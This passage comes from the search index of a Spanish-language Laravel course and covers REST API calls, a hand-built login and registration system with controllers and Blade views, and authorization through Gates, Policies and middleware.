Chollo::all();\n\n        return view('rest', compact('chollos'));\n    }\n}\n</code></pre> <p>Modificamos nuestra vista <code>blade</code> para poder listar los datos correctamente o si lo prefieres, puedes crear una ruta nueva e incluso un nuevo controlador que se encargue de manejar las llamadas a la API.</p> <p>El nombre que va entre corchetes es el nombre de las columnas de la tabla de la base de datos</p> <pre><code>&lt;?php\n// estamos en \u2593\u2593\u2593 chollos.blade.php\n\n@foreach ($chollos as $chollo)\n    &lt;p&gt;ID:  {{ $chollo -&gt; id }}&lt;/p&gt; // Columna ID\n    &lt;p&gt;Nombre:  {{ $chollo -&gt; nombre }}&lt;/p&gt;  // Columna NOMBRE\n    &lt;p&gt;Descripci\u00f3n:  {{ $chollo -&gt; descripcion }}&lt;/p&gt;  // Columna DESCRIPCION\n\n    // [...]\n    &lt;hr&gt;\n@endforeach\n</code></pre>"},{"location":"10apiREST.html#enviando-datos-post","title":"Enviando datos (POST)","text":"<p>En una API, para poder enviar datos y que se guarden en la base de datos, debemos usar el m\u00e9todo post bajo <code>Http</code> y pasarle los nuevos datos como un array asociativo, poniendo como <code>clave</code> el nombre de las columnas de la base de datos</p> <pre><code>&lt;?php\n\n$response = Http::post('http://localhost:8000/api/chollo-severo', [\n    'titulo' =&gt; 'Chollazo para este producto',\n    'descripcion' =&gt; 'Lorem ipsum dolo...',\n\n// [...]\n]);\n</code></pre>"},{"location":"10apiREST.html#actividades","title":"Actividades","text":"<ol> <li>Chollo Severo V 2.0 Crea un controlador nuevo que se llame <code>RestController</code> (o como quieras llamarlo) y escribe todos los m\u00e9todos que necesites para convertir tu <code>app</code> que, consume de una Base de Datos, a una <code>Restful App</code> que reciba los datos a trav\u00e9s de la API de tu proyecto de Chollos.</li> </ol>"},{"location":"10laravelAutenticacion.html","title":"10laravelAutenticacion","text":""},{"location":"10laravelAutenticacion.html#seguridad-en-laravel","title":"Seguridad en Laravel","text":"<p>Duraci\u00f3n estimada: 4 sesiones</p>"},{"location":"10laravelAutenticacion.html#101-autenticacion","title":"10.1 Autenticaci\u00f3n","text":""},{"location":"10laravelAutenticacion.html#introduccion","title":"Introducci\u00f3n","text":"<p>La mayor\u00eda de aplicaciones web permiten que sus usuarios se autentiquen mediante un sistema de \"Login\" o \"Inicio de sesi\u00f3n\". Implementar esta funci\u00f3n de forma manual puede ser complejo y arriesgado. Por eso, Laravel se esfuerza por proporcionar herramientas para implementar la autenticaci\u00f3n de manera r\u00e1pida, segura y f\u00e1cil.</p> <p>En su n\u00facleo, las instalaciones de autenticaci\u00f3n de Laravel se componen de \"guards\" (guardias) y \"providers\" (proveedores). Los guardias definen c\u00f3mo se autentican los usuarios para cada solicitud. Por ejemplo, el guardia session mantiene el estado utilizando almacenamiento de sesi\u00f3n y cookies.</p> <p>El archivo de configuraci\u00f3n de autenticaci\u00f3n de tu aplicaci\u00f3n se encuentra en <code>config/auth.php</code>. Contiene varias opciones documentadas para ajustar el comportamiento de los servicios de autenticaci\u00f3n de Laravel.</p>"},{"location":"10laravelAutenticacion.html#kits-de-inicio","title":"Kits de inicio","text":"<p>Laravel proporciona unos kits de inicio que estructuran autom\u00e1ticamente la aplicaci\u00f3n con las rutas, controladores y vistas necesarios para registrar y autenticar a los usuarios de la aplicaci\u00f3n. Los m\u00e1s utilizados son Breeze y JetStream. Ambos, aparecen entre las opciones al crear un nuevo proyecto Laravel.</p> <p>Laravel Breeze es una implementaci\u00f3n simple y m\u00ednima de todas las funciones de autenticaci\u00f3n de Laravel, que incluye inicio de sesi\u00f3n, registro, restablecimiento de contrase\u00f1a, verificaci\u00f3n de correo electr\u00f3nico y confirmaci\u00f3n de contrase\u00f1a. La capa de vista de Laravel Breeze est\u00e1 compuesta por plantillas Blade con estilos de Tailwind CSS. </p> <p>Laravel Jetstream es un s\u00f3lido kit de inicio de aplicaciones que consume y expone los servicios del backend de autenticaci\u00f3n Laravel Fortify con una interfaz de usuario basada en Tailwind CSS, Livewire y/o Inertia. Laravel Jetstream incluye soporte opcional para la autenticaci\u00f3n de dos factores, soporte para equipos, gesti\u00f3n de sesiones de navegador, gesti\u00f3n de perfiles e integraci\u00f3n incorporada con Laravel Sanctum para ofrecer autenticaci\u00f3n de token de API. </p> <p>Puedes probar a crear un proyecto y utilizar uno de estos kits, sobre todo Breeze, para navegar por sus archivos y aprender c\u00f3mo funciona un sistema de autenticaci\u00f3n.</p>"},{"location":"10laravelAutenticacion.html#sistema-autenticacion-manual","title":"Sistema autenticaci\u00f3n manual","text":"<p>Mejor incluso que empezar utilizando un kit de inicio, es crear un sistema de autenticaci\u00f3n de forma manual. As\u00ed, aprender\u00e1s paso a paso c\u00f3mo funciona la autenticaci\u00f3n. Y es lo que vamos a hacer en este punto. Una vez que entiendas todos los puntos, para futuras aplicaciones ser\u00e1 m\u00e1s pr\u00e1ctico empezar el desarrollo con un kit de inicio.</p> <p>Vamos a necesitar unas vistas con los formularios de login y registro, unas rutas y controladores con sus funciones asociadas.</p>"},{"location":"10laravelAutenticacion.html#1-rutas-para-login-registro-y-logout","title":"1. Rutas para login, registro y logout","text":"<p>En <code>web.php</code> agregamos las rutas necesarias para:</p> <ul> <li>Mostrar el formulario de registro y procesar sus datos.</li> <li>Mostrar el formulario de login y procesar sus datos.</li> <li>Cerrar sesi\u00f3n.</li> </ul> <pre><code>&lt;?php\n// Rutas auth\nRoute::get('/register', [RegisterController::class, 'create']);  //Formulario de registro\nRoute::post('/register', [RegisterController::class, 'store']);  //Registrar usuario\n\nRoute::get('/login', [SessionController::class, 'create']);  //Formulario de login\nRoute::post('/login', [SessionController::class, 'store'])-&gt;name('login');  //Iniciar sesi\u00f3n\n\nRoute::post('/logout', [SessionController::class, 'destroy']);  //Cerrar sesi\u00f3n \n</code></pre>"},{"location":"10laravelAutenticacion.html#2-controladores-necesarios","title":"2. Controladores necesarios","text":"<p>Creamos 2 controladores:</p> <ul> <li><code>RegisterController</code>, encargado del registro de usuarios.</li> <li><code>SessionController</code>, encargado del inicio y cierre de sesi\u00f3n.</li> </ul> <pre><code>php artisan make:controller RegisterController\nphp artisan make:controller SessionController\n</code></pre> <p>Empezamos con <code>RegisterController</code>, que va a tener 2 funciones:</p> <ul> <li><code>create</code>: simplemente muestra la vista del formulario de registro.</li> <li><code>store</code>: recibe los datos del formulario de registro y si son v\u00e1lidos, crea el usuario en la BDD, inicia su sesi\u00f3n y redirige a la p\u00e1gina de inicio.</li> </ul> <pre><code>&lt;?php\nnamespace App\\Http\\Controllers;\n\nuse App\\Models\\User;\nuse Illuminate\\Http\\Request;\nuse Illuminate\\Support\\Facades\\Auth;\nuse Illuminate\\Validation\\Rules\\Password;\n\nclass RegisterController extends Controller\n{\n    // Muestra la vista del formulario de registro \n    public function create(){ return view('auth.register'); }\n\n    // Procesa los datos del formulario de registro\n    public function store(Request $request){\n        // Validaci\u00f3n\n        $validatedAttributes = $request-&gt;validate([\n            'name' =&gt; 'required',\n            'email' =&gt; 'required|email',\n            'password' =&gt; ['required', Password::min(8)-&gt;mixedCase()-&gt;numbers()-&gt;symbols(), 'confirmed:password_confirmation'],\n        ]);\n\n        // Creaci\u00f3n del usuario\n        $user = User::create($validatedAttributes); \n\n        // Inicio de sesi\u00f3n con la instancia del usuario (login)\n        Auth::login($user);\n\n        // Redirecci\u00f3n a p\u00e1gina de inicio\n        return redirect('/');\n    }\n}\n</code></pre> <p>Es el turno de <code>SessionController</code>, que va a tener 3 funciones:</p> <ul> <li><code>create</code>: simplemente muestra la vista del formulario de login.</li> <li><code>store</code>: recibe los datos del formulario de login y si son v\u00e1lidos, intenta iniciar sesi\u00f3n con ellos y redirige a la p\u00e1gina de inicio.</li> <li><code>destroy</code>: cierra la sesi\u00f3n, invalid\u00e1ndola y redirigiendo a la p\u00e1gina de inicio.</li> </ul> <pre><code>&lt;?php\nnamespace App\\Http\\Controllers;\n\nuse Illuminate\\Support\\Facades\\Auth;\nuse Illuminate\\Validation\\ValidationException;\n\nclass SessionController extends Controller\n{\n    // Muestra la vista del formulario de login \n    public function create(){\n        return view('auth.login');\n    }\n\n    // Procesa los datos del formulario de login\n    public function store(Request $request){ \n       //Validar los datos email y password\n       $request-&gt;validate([\n            'email' =&gt; 'required|email',\n            'password' =&gt; 'required',\n       ]);\n\n       $attributes = $request-&gt;only(['email', 'password']);\n\n       // Intentar iniciar sesi\u00f3n con esos datos (email y password)\n       if (!Auth::attempt($attributes)) {\n            throw ValidationException::withMessages([\n                'email' =&gt; 'Esas credenciales no son correctas.'\n            ]);\n        }\n\n       // Registrar sesi\u00f3n regenerando su id \n       $request-&gt;session()-&gt;regenerate();\n\n       // Redirecci\u00f3n a la p\u00e1gina de inicio\n       return redirect('/');\n    }\n\n    // Cierra sesi\u00f3n\n    public function destroy(Request $request){\n        // Cerrar sesi\u00f3n\n        Auth::logout();\n\n        // Invalidar la sesi\u00f3n\n        $request-&gt;session()-&gt;invalidate();\n\n        // Redirecci\u00f3n a la p\u00e1gina de inicio\n        return redirect('/');\n    }\n}\n</code></pre>"},{"location":"10laravelAutenticacion.html#3-vistas-login-y-register","title":"3. Vistas login y register","text":"<p>Vamos a crear las vistas para los formularios de inicio de sesi\u00f3n y registro dentro de una carpeta com\u00fan <code>auth</code> para su mejor organizaci\u00f3n.</p> <p>Vista para el fomulario de registro en <code>/resources/views/auth/register.blade.php</code>:</p> <pre><code>@extends('layout.app')\n@section('content')\n&lt;div class=\"flex min-h-full items-center justify-center py-12 px-4 sm:px-6 lg:px-8\"&gt;\n    &lt;div class=\"w-full max-w-md space-y-8\"&gt;\n      &lt;div&gt;\n        &lt;h2 class=\"mt-6 text-center text-3xl font-bold tracking-tight text-gray-900\"&gt;Registro&lt;/h2&gt;\n      &lt;/div&gt;\n      &lt;form method=\"POST\" action=\"/register\"&gt;\n        @csrf\n\n        &lt;div class=\"space-y-12\"&gt;\n          &lt;div class=\"border-b border-gray-900/10 pb-12\"&gt;\n            &lt;div class=\"flex flex-col gap-3\"&gt;\n\n                &lt;div class=\"mb-4\"&gt;\n                    &lt;label for=\"name\" class=\"block text-sm font-medium text-gray-700\"&gt;Nombre&lt;/label&gt;\n                    &lt;div class=\"mt-2\"&gt;\n                        &lt;input type=\"text\" name=\"name\" id=\"name\" value=\"{{ old('name')}}\" required \n                            class=\"w-full px-3 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-indigo-500 focus:border-indigo-500\"&gt;\n                        @error('name')\n                            &lt;p class=\"mt-1 text-sm text-red-600\"&gt;{{ $message }}&lt;/p&gt;\n                        @enderror\n                    &lt;/div&gt;\n                &lt;/div&gt;\n\n                &lt;div class=\"mb-4\"&gt;\n                    &lt;label for=\"email\" class=\"block text-sm font-medium text-gray-700\"&gt;Email&lt;/label&gt;\n                    &lt;div class=\"mt-2\"&gt;\n                        &lt;input type=\"email\" name=\"email\" id=\"email\" value=\"{{ old('email')}}\" required \n                            class=\"w-full px-3 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-indigo-500 focus:border-indigo-500\"&gt;\n                        @error('email')\n                            &lt;p class=\"mt-1 text-sm text-red-600\"&gt;{{ $message }}&lt;/p&gt;\n                        @enderror\n                    &lt;/div&gt;\n                &lt;/div&gt;\n\n                &lt;div class=\"mb-4\"&gt;\n                    &lt;label for=\"password\" class=\"block text-sm font-medium text-gray-700\"&gt;Password&lt;/label&gt;\n                    &lt;div class=\"mt-2\"&gt;\n                        &lt;input type=\"password\" name=\"password\" id=\"password\" required \n                            class=\"w-full px-3 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-indigo-500 focus:border-indigo-500\"&gt;\n                        @error('password')\n                            &lt;p class=\"mt-1 text-sm text-red-600\"&gt;{{ $message }}&lt;/p&gt;\n                        @enderror\n                    &lt;/div&gt;\n                &lt;/div&gt;\n\n                &lt;div class=\"mb-4\"&gt;\n                    &lt;label for=\"password_confirmation\" class=\"block text-sm font-medium text-gray-700\"&gt;Repite el Password&lt;/label&gt;\n                    &lt;div class=\"mt-2\"&gt;\n                        &lt;input type=\"password\" name=\"password_confirmation\" id=\"password_confirmation\" required \n                            class=\"w-full px-3 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-indigo-500 focus:border-indigo-500\"&gt;\n                        @error('password_confirmation')\n                            &lt;p class=\"mt-1 text-sm text-red-600\"&gt;{{ $message }}&lt;/p&gt;\n                        @enderror\n                    &lt;/div&gt;\n                &lt;/div&gt;\n\n\n            &lt;/div&gt;\n          &lt;/div&gt;\n        &lt;/div&gt;\n\n        &lt;div class=\"mt-6 flex items-center justify-end gap-x-6\"&gt;\n          &lt;a href=\"/\" class=\"text-sm font-semibold leading-6 text-gray-900\"&gt;Cancelar&lt;/a&gt;\n          &lt;input type=\"submit\" value=\"Registro\" class=\"bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded\" /&gt;\n        &lt;/div&gt;\n      &lt;/form&gt;\n    &lt;/div&gt;\n  &lt;/div&gt;\n@endsection\n</code></pre> <p>Vista para el fomulario de login en <code>/resources/views/auth/login.blade.php</code>:</p> <pre><code>@extends('layout.app')\n@section('content')\n&lt;div class=\"flex min-h-full items-center justify-center py-12 px-4 sm:px-6 lg:px-8\"&gt;\n    &lt;div class=\"w-full max-w-md space-y-8\"&gt;\n\n      &lt;div&gt;\n        &lt;h2 class=\"mt-6 text-center text-3xl font-bold tracking-tight text-gray-900\"&gt;Log In&lt;/h2&gt;\n      &lt;/div&gt;\n\n      &lt;form class=\"flex-[0.5]\" method=\"POST\" action=\"/login\"&gt;\n        @csrf\n\n        &lt;div class=\"space-y-12\"&gt;\n          &lt;div class=\"border-b border-gray-900/10 pb-12\"&gt;\n            &lt;div class=\"flex flex-col gap-3\"&gt;\n\n                &lt;div class=\"mb-4\"&gt;\n                    &lt;label for=\"email\" class=\"block text-sm font-medium text-gray-700\"&gt;Email&lt;/label&gt;\n                    &lt;div class=\"mt-2\"&gt;\n                        &lt;input type=\"email\" name=\"email\" id=\"email\" value=\"{{ old('email') }}\" required \n                            class=\"w-full px-3 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-indigo-500 focus:border-indigo-500\"&gt;\n                        @error('email')\n                            &lt;p class=\"mt-1 text-sm text-red-600\"&gt;{{ $message }}&lt;/p&gt;\n                        @enderror\n                    &lt;/div&gt;\n                &lt;/div&gt;\n\n                &lt;div class=\"mb-4\"&gt;\n                    &lt;label for=\"password\" class=\"block text-sm font-medium text-gray-700\"&gt;Password&lt;/label&gt;\n                    &lt;div class=\"mt-2\"&gt;\n                        &lt;input type=\"password\" name=\"password\" id=\"password\" required \n                            class=\"w-full px-3 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-indigo-500 focus:border-indigo-500\"&gt;\n                        @error('password')\n                            &lt;p class=\"mt-1 text-sm text-red-600\"&gt;{{ $message }}&lt;/p&gt;\n                        @enderror\n                    &lt;/div&gt;\n                &lt;/div&gt;\n\n            &lt;/div&gt;\n          &lt;/div&gt;\n        &lt;/div&gt;\n\n        &lt;div class=\"mt-6 flex items-center justify-end gap-x-6\"&gt;\n          &lt;a href=\"/\" class=\"text-sm font-semibold leading-6 text-gray-900\"&gt;Cancelar&lt;/a&gt;\n          &lt;input type=\"submit\" value=\"Log In\" class=\"bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded\" /&gt;\n        &lt;/div&gt;\n      &lt;/form&gt;\n    &lt;/div&gt;\n  &lt;/div&gt;\n@endsection\n</code></pre>"},{"location":"10laravelAutenticacion.html#4-vistas-de-plantilla-base-y-menu","title":"4. Vistas de plantilla base y menu","text":"<p>Crear la vista con la plantilla base en <code>/resources/views/layout/app.blade.php</code>:</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=\"utf-8\"&gt;\n        &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;\n\n        &lt;title&gt;Laravel&lt;/title&gt;\n\n        &lt;!-- Fonts --&gt;\n        &lt;link rel=\"preconnect\" href=\"https://fonts.bunny.net\"&gt;\n        &lt;link href=\"https://fonts.bunny.net/css?family=figtree:400,500,600&amp;display=swap\" rel=\"stylesheet\" /&gt;\n\n        &lt;!-- Styles / Scripts --&gt;\n        @vite(['resources/css/app.css', 'resources/js/app.js'])\n\n    &lt;/head&gt;\n    &lt;body class=\"flex flex-col min-h-screen\"&gt;\n       &lt;header class=\"bg-blue-800 text-white\"&gt;\n            @include('partials.menu')\n       &lt;/header&gt;\n       &lt;main class=\"flex-grow\"&gt;\n            @yield('content')\n       &lt;/main&gt;\n       &lt;footer class=\"pl-10 text-center bg-blue-800 text-white py-4\"&gt;\n            Aplicaci\u00f3n desarrollada por \ud83e\uddab en 2025\n       &lt;/footer&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Con la directiva @auth podemos mostrar contenido si el usuario est\u00e1 logueado y con @guest si no lo est\u00e1. Realmente son un if encubierto, donde simplemente se comprueba si existe un usuairo logueado o no. En la siguiente vista los utilizamos para mostrar unos men\u00fas u otros seg\u00fan el estado de la sesi\u00f3n.</p> <p>Crear la vista con el men\u00fa con la navegaci\u00f3n y opciones en <code>/resources/views/partials/menu.blade.php</code>:</p> <pre><code>&lt;div class=\"flex h-16 items-center justify-between\"&gt;\n    &lt;div class=\"flex items-center\"&gt;\n        &lt;div class=\"ml-10 flex items-baseline space-x-4\"&gt;\n\n            @php\n                $currentRoute = request()-&gt;path();\n            @endphp\n\n            &lt;nav class=\"flex space-x-4\"&gt;\n                &lt;a href=\"/\" class=\"{{ $currentRoute === '/' ? 'text-orange-300 font-semibold' : ' hover:text-orange-300' }}\"&gt;\n                    Inicio\n                &lt;/a&gt;\n                &lt;a href=\"/usuarios\" class=\"{{ $currentRoute === 'usuarios' ? 'text-orange-300 font-semibold' : 'hover:text-orange-300' }}\"&gt;\n                    Usuarios\n                &lt;/a&gt;\n                &lt;!--\n                    ...\n                --&gt;\n            &lt;/nav&gt;\n\n        &lt;/div&gt;\n    &lt;/div&gt;\n\n    &lt;!-- Enlaces para login/register --&gt;\n    &lt;div class=\"ml-4 mr-10 flex items-center md:ml-6\"&gt;\n        &lt;!-- Visible para invitados --&gt;\n        @guest\n            &lt;nav class=\"flex space-x-4\"&gt;\n                &lt;a href=\"/login\" class=\"{{ $currentRoute === 'login' ? 'text-orange-300 font-semibold' : ' hover:text-orange-300' }}\"&gt;\n                    Log In\n                &lt;/a&gt;\n                &lt;a href=\"/register\" class=\"{{ $currentRoute === 'register' ? 'text-orange-300 font-semibold' : ' hover:text-orange-300' }}\"&gt;\n                    Registro\n                &lt;/a&gt;\n            &lt;/nav&gt;\n        @endguest\n\n        &lt;!-- Visible para usuarios autenticados --&gt;\n        @auth\n            &lt;form method=\"POST\" action=\"/logout\"&gt;\n                @csrf\n                &lt;button class-name=\"text-gray-300 hover:text-white bg-transparent hover:bg-transparent\"&gt;Cerrar sesi\u00f3n&lt;/button&gt;\n            &lt;/form&gt;\n        @endauth\n        &lt;/div&gt;\n  &lt;/div&gt;\n</code></pre>"},{"location":"10laravelAutenticacion.html#5-personalizacion-de-la-pagina-de-inicio","title":"5. Personalizaci\u00f3n de la p\u00e1gina de inicio","text":"<p>Vamos a personalizar la p\u00e1gina de inicio mostrando un mensaje de bienvenida si el usuario est\u00e1 logueado o un mensaje gen\u00e9rico si no lo est\u00e1. Para ello vamos a utilizar el helper auth() para acceder a los datos del usuario logueado.</p> <p>En primer lugar, creamos la ruta en <code>web.php</code>:</p> <pre><code>&lt;?php\nRoute::get('/', function () { return view('sections.home'); });\n</code></pre> <p>Y ahora la vista en <code>/resources/views/sections/home.blade.php</code>:</p> <pre><code>@extends('layout.app')\n@section('content')\n&lt;div class=\"flex min-h-full items-center justify-center py-12 px-4 sm:px-6 lg:px-8\"&gt;\n    &lt;div class=\"w-full max-w-md space-y-8\"&gt;\n\n      &lt;div&gt;\n        &lt;h2 class=\"mt-6 text-center text-3xl font-bold tracking-tight text-gray-900\"&gt;Home&lt;/h2&gt;\n      &lt;/div&gt;\n\n        @auth\n            &lt;p class=\"text-center text-xl text-green-600\"&gt;Bienvenido {{ auth()-&gt;user()-&gt;name }}!&lt;/p&gt;\n        @endauth\n\n        @guest\n            &lt;p class=\"text-center text-xl text-orange-400\"&gt;Hola invitado/a.&lt;/p&gt;\n            &lt;p&gt;Inicia sesi\u00f3n desde le men\u00fa superior o reg\u00edstrate si todav\u00eda no tienes cuenta.&lt;/p&gt;\n        @endguest\n    &lt;/div&gt;\n&lt;/div&gt;\n@endsection\n</code></pre>"},{"location":"10laravelAutenticacion.html#6-proteger-rutas","title":"6. Proteger rutas","text":"<p>Mediante el middleware <code>auth</code> de Laravel, podemos proteger rutas para que solo los usuarios autenticados puedan acceder a ellas:</p> <pre><code>&lt;?php\nRoute::get('/dashboard', function () {\n    return view('dashboard');\n})-&gt;middleware('auth');\n</code></pre> <p>En el siguiente punto se ampl\u00eda el uso de middlewares.</p>"},{"location":"10laravelAutenticacion.html#resumen","title":"Resumen","text":"<ul> <li>Mediante <code>auth()</code> se acceden a los datos del usuario. Ej: <code>auth()-&gt;user()-&gt;name;</code></li> <li>Con <code>Auth::login($usuario)</code> se inicia sesi\u00f3n con una instancia de un usuario.</li> <li>Con <code>Auth::attempt(['email', 'password'])</code> se intenta iniciar sesi\u00f3n con email y password devolviendo - un boolean si ha tenido o no \u00e9xito.</li> <li>Con <code>Auth::logout()</code> se cierra la sesi\u00f3n.</li> <li>Se puede utilizar indistintamente el helper global <code>request()</code> o <code>$request</code> para trabajar con las peticiones. Si se hace con el segundo, hay que pasarlo expl\u00edcitamente como par\u00e1metro <code>Request $request</code> en la funci\u00f3n del controlador que se trate. Mejor pr\u00e1ctica esta \u00faltima porque mejora la legibilidad, el testing y mantenimiento.</li> <li>Con las directivas <code>@auth</code> y <code>@guest</code> en plantillas se puede mostrar contenido visible para usuarios autenticados o para invitados respectivamente.</li> <li>Mediante el middleware <code>auth</code> hacemos que ciertas rutas s\u00f3lo sean accesibles a usuarios autenticados.</li> <li>Utilizar <code>request()-&gt;session()-&gt;invalidate()</code> al cerrar la sesi\u00f3n o <code>request()-&gt;session()-&gt;regenerate()</code> en el login, son buenas pr\u00e1cticas que mejoran la seguridad.</li> </ul>"},{"location":"10laravelAutenticacion.html#102-autorizacion","title":"10.2 Autorizaci\u00f3n","text":""},{"location":"10laravelAutenticacion.html#introduccion_1","title":"Introducci\u00f3n","text":"<p>Laravel 11 ofrece un sistema de autorizaci\u00f3n flexible y potente basado en policies y gates, permitiendo restringir el acceso a diferentes partes de la aplicaci\u00f3n seg\u00fan los permisos del usuario.</p>"},{"location":"10laravelAutenticacion.html#gates","title":"Gates","text":"<p>Los Gates son funciones de cierre (closures) que determinan si un usuario est\u00e1 autorizado para realizar una acci\u00f3n espec\u00edfica.</p>"},{"location":"10laravelAutenticacion.html#definir-un-gate","title":"Definir un Gate","text":"<p>Los Gates se definen en <code>app/Providers/AppServiceProvider.php</code> dentro del m\u00e9todo <code>boot()</code>. Los Gates siempre reciben la instancia del usuario como primer argumento y opcionalmente argumentos adicionales como otros modelos Eloquent que sean necesarios:</p> <pre><code>&lt;?php\nuse Illuminate\\Support\\ServiceProvider;\nuse Illuminate\\Support\\Facades\\Gate;\nuse App\\Models\\User;\n\nclass AppServiceProvider extends ServiceProvider\n{\n    // ...\n\n    public function boot()\n    {\n        Gate::define('ver-admin', function (User $user) {\n            return $user-&gt;role === 'admin';\n        });\n\n        Gate::define('update-post', function (User $user, Post $post) {\n            return $user-&gt;id === $post-&gt;user_id;\n        });\n\n        // Como en las rutas, los Gates tambi\u00e9n se pueden definir utilizando un array con la clase y funci\u00f3n\n        Gate::define('update-post', [PostPolicy::class, 'update']);\n    }\n}\n</code></pre>"},{"location":"10laravelAutenticacion.html#usar-un-gate","title":"Usar un Gate","text":"<p>Para verificar el permiso en un controlador:</p> <pre><code>&lt;?php\nif (Gate::allows('ver-admin')) {\n    // El usuario tiene autorizaci\u00f3n\n}\n\nif (Gate::denies('update-post', $post)) {\n    // El usuario no tiene autorizaci\u00f3n\n}\n</code></pre> <p>En una vista Blade:</p> <pre><code>@can('ver-admin')\n    &lt;p&gt;Eres administrador.&lt;/p&gt;\n@endcan\n</code></pre> M\u00e9todos de Gates <p>Existen m\u00e1s m\u00e9todos en las Gates. An\u00edmate a investigarlos en la documentaci\u00f3n oficial. Tanto los m\u00e9todos de Gate para autorizar acciones como <code>allows</code>, <code>denies</code>, <code>check</code>, <code>any</code>, <code>none</code>, <code>authorize</code>, <code>can</code>, <code>cannot</code> y las directivas de autorizaci\u00f3n Blade <code>@can</code>, <code>@cannot</code>, <code>@canany</code> pueden recibir un array como segundo argumento, cuyos elementos se pasan como par\u00e1metros a la funci\u00f3n closure de la Gate y se pueden uilizar utilizar para dar contexto adicional.</p> <pre><code>&lt;?php\n// En AppServiceProvider -&gt; boot()\nGate::define('create-post', function (User $user, Category $category, bool $pinned) {\n    if (! $user-&gt;canPublishToGroup($category-&gt;group)) {\n        return false;\n    } elseif ($pinned &amp;&amp; ! $user-&gt;canPinPosts()) {\n        return false;\n    }\n\n    return true;\n});\n\n// En un controlador donde sea necesario comprobar si el usuario tiene la autorizaci\u00f3n\nif (Gate::check('create-post', [$category, $pinned])) {\n    // The user can create the post...\n}\n</code></pre>"},{"location":"10laravelAutenticacion.html#policies","title":"Policies","text":"<p>Las Policies son clases espec\u00edficas para manejar la autorizaci\u00f3n de modelos.</p>"},{"location":"10laravelAutenticacion.html#crear-una-policy","title":"Crear una Policy","text":"<p>Ejecutar el comando:</p> <pre><code>php artisan make:policy PostPolicy\n</code></pre> <p>Opcionalmente puedes indicarle el flag <code>--model=Modelo</code> para generar la policy con m\u00e9todos de ejemplo sobre el modelo propuesto. </p> <p>Esto crea <code>app/Policies/PostPolicy.php</code>, donde se definen los m\u00e9todos de autorizaci\u00f3n:</p> <pre><code>&lt;?php\nuse App\\Models\\User;\nuse App\\Models\\Post;\n\nclass PostPolicy\n{\n    public function update(User $user, Post $post)\n    {\n        return $user-&gt;id === $post-&gt;user_id;\n    }\n}\n</code></pre>"},{"location":"10laravelAutenticacion.html#registrar-una-policy","title":"Registrar una Policy","text":"<p>Por defecto Laravel descubre y asocia las policies si est\u00e1n correctamente nombradas y ubicadas, por ejemplo PostPolicy en <code>app/Policies</code> para una clase Post en <code>app/Models</code>. Si no fuera el caso, es posible registrar la asociaci\u00f3n entre modelo y policy de forma manual en el m\u00e9todo <code>boot()</code> de <code>AppServiceProvider.php</code>:</p> <pre><code>&lt;?php\nuse App\\Models\\Post;\nuse App\\Policies\\PostPolicy;\nuse Illuminate\\Support\\Facades\\Gate;\n\n// ...\n\npublic function boot(): void\n{\n    // Clase Post con policy PostPolicy (esto, Laravel lo saca solo, no ser\u00eda necesario)\n    Gate::policy(Post::class, PostPolicy::class);\n}\n</code></pre>"},{"location":"10laravelAutenticacion.html#usar-una-policy","title":"Usar una Policy","text":"<p>En un controlador:</p> <pre><code>&lt;?php\n\nnamespace App\\Http\\Controllers;\n\nuse App\\Http\\Controllers\\Controller;\nuse App\\Models\\Post;\nuse Illuminate\\Http\\RedirectResponse;\nuse Illuminate\\Http\\Request;\n\nclass PostController extends Controller\n{\n    // Actualizar el post pasado como argumento\n    public function update(Request $request, Post $post): RedirectResponse\n    {\n        if ($request-&gt;user()-&gt;cannot('update', $post)) {\n            abort(403);\n        }      \n\n        // Aqu\u00ed el c\u00f3digo para actualizar el post...\n\n        return redirect('/posts');\n    }\n}\n</code></pre> <p>En una vista Blade:</p> <pre><code>@can('update', $post)\n    &lt;button&gt;Editar&lt;/button&gt;\n@endcan\n</code></pre> <p>En algunos casos es necesario pasar la propia definici\u00f3n de la clase en lugar de una instancia de la misma, como hac\u00edamos con <code>post</code> en el ejemplo anterior.</p> <p>En un controlador:</p> <pre><code>&lt;?php\npublic function usuarios(Request $request){\n    // Las 3 opciones siguientes son v\u00e1lidas\n    // if ($request-&gt;user()-&gt;cannot('show', $request-&gt;user())) { \n    // if ($request-&gt;user()-&gt;cannot('show', Auth::user())) { \n    if ($request-&gt;user()-&gt;cannot('show', User::class)) { \n        abort(403);\n    }\n\n    return view('sections.usuarios');\n}\n</code></pre> <p>En una vista Blade:</p> <pre><code>// Las 3 opciones siguientes son v\u00e1lidas\n// @can('show', auth()-&gt;user())\n// @can('show', Auth::user())\n@can('show', 'App\\Models\\User')\n    &lt;p&gt;Tienes autorizaci\u00f3n para ver este contenido.&lt;/p&gt;\n@endcan\n</code></pre>"},{"location":"10laravelAutenticacion.html#middlewares","title":"Middlewares","text":"<p>Los middlewares permiten restringir el acceso a rutas en funci\u00f3n de la autenticaci\u00f3n y permisos del usuario.</p>"},{"location":"10laravelAutenticacion.html#middleware-auth","title":"Middleware <code>auth</code>","text":"<p>Para proteger rutas y asegurarse de que solo los usuarios autenticados puedan acceder:</p> <pre><code>&lt;?php\nRoute::get('/dashboard', function () {\n    return view('dashboard');\n})-&gt;middleware('auth');\n</code></pre>"},{"location":"10laravelAutenticacion.html#middleware-can","title":"Middleware <code>can</code>","text":"<p>Para aplicar autorizaci\u00f3n espec\u00edfica en rutas mediante gates o policies definidas:</p> <pre><code>&lt;?php\nRoute::get('/admin', [AdminController::class, 'view'])-&gt;middleware('can:ver-admin');\n\n// OJO! Para que coja 'post' como objeto del tipo Post y no como id (string), en la funci\u00f3n edit hay \n// que pasar el par\u00e1metro como Post y as\u00ed Laravel recuperar\u00e1 autom\u00e1ticamente el Post con ese id\nRoute::get('/post/{post}/edit', [PostController::class, 'edit'])-&gt;middleware('can:update, post');\n\nRoute::get('/usuarios', [PagesController::class, 'usuarios'])-&gt;middleware('can:show, App\\Models\\User'); 